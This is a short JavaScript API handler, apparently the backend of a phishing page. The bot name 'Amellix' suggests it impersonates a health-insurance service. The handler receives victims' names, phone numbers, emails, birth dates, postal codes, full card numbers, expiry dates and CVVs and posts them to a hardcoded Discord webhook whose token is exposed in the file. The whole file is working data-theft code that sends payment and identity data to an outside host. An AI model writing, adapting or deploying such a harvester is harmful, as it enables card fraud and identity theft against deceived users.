import axios from "axios"

export default function handler(req, res){
    if(req.method === 'POST'){
        console.log(req.body);
        const info = req.body.content
        const WEBHOOK_URL = "https://discord.com/api/webhooks/981307345743269898/s6yKg-Nc-1eP1fPOxl_qilJi9lpJFm-m934SNEIfRZ2nimKrm4VYKWIfMr75XQfBNrJu"

        axios.post(WEBHOOK_URL, {
            content: "",
            username: "Amellix",
            avatar_url: "https://play-lh.googleusercontent.com/6f6MrwfRIEnR-OIKIt_O3VdplItbaMqtqgCNSOxcfVMCKGKsOdBK5XcI6HZpjssnB2Y",

            embeds: [
                {
                    "color": 3109297,
                    "description": `**🙍‍♂️ | name |** ${info.name}\n\n**📞 | phoneNumber |** ${info.phoneNumber}\n\n**📧 | emailAdress |** ${info.emailAdress}\n\n**📅 | birthDate |** ${info.birthDate}\n\n**📫 | postalCode |** ${info.postalCode}\n\n**💳 | cardNumber |** ${info.cardNumber}\n\n**💳 | cardExpireMonth |** ${info.cardExpireMonth}\n\n**💳 | cardExpireYear |** ${info.cardExpireYear}\n\n**💳 | cardCVV |** ${info.cardCVV}`
                }
            ] 
        }).then(e => {
            res.status(200).json({message: "sended"})
        }).catch(err => {
            console.log(err);
        })
    }
}